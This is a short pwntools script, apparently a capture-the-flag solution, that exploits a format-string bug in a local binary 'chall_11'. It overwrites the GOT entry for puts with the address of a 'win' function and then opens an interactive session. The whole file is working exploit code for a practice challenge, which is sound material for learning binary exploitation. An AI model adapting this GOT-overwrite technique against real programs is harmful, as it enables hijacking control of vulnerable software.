# coding: utf-8
from pwn import *
pr = process("./chall_11")
elf = ELF("./chall_11")
payload = fmtstr_payload(7, {elf.got.puts : elf.sym.win})
pr.sendline(payload)
pr.interactive()
pr.close()
